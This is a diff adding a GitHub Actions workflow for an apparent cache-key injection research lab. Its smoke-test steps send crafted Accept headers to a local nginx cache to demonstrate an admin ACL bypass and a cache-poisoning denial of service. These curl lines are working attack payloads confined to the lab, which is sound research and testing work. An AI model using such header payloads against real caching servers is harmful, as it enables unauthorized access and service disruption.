@@ -1,0 +1,74 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+jobs:
+  test-ckinject:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install dependencies
+        run: pip install -r requirements-dev.txt
+
+      - name: Run ckinject unit tests (no Docker needed)
+        run: python -m pytest tests/ -v
+
+  lint-nginx-config:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Syntax-check nginx.conf
+        run: |
+          docker run --rm \
+            -v "${{ github.workspace }}/lab/nginx/nginx.conf:/etc/nginx/nginx.conf:ro" \
+            nginx:1.27 nginx -t
+
+  lab-smoke-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Generate self-signed certs
+        run: |
+          cd lab
+          ./scripts/gen-certs.sh
+
+      - name: Build and start the lab
+        run: |
+          cd lab
+          docker compose up -d --build
+          sleep 5
+
+      - name: Seed admin cache and verify ACL-bypass collision (Scenario 1)
+        run: |
+          docker exec ck_nginx curl -s -H "Accept: */*" http://127.0.0.1:80/admin -o /dev/null
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Accept: min*/*" http://localhost:8080/ad)
+          echo "status=$STATUS"
+          test "$STATUS" = "200"
+          curl -s -H "Accept: min*/*" http://localhost:8080/ad | grep -q "Admin Dashboard"
+
+      - name: Verify CPDoS collision (Scenario 2)
+        run: |
+          curl -s -H "Accept: ome2*/*" http://localhost:8080/h2 -o /dev/null || true
+          curl -s -H "Accept: ome*/*" http://localhost:8080/h -o /dev/null
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Accept: */*" http://localhost:8080/home)
+          echo "status=$STATUS"
+          test "$STATUS" = "404"
+
+      - name: Dump logs on failure
+        if: failure()
+        run: docker compose -f lab/docker-compose.yml logs
+
+      - name: Tear down
+        if: always()
+        run: |
+          cd lab
+          docker compose down -v
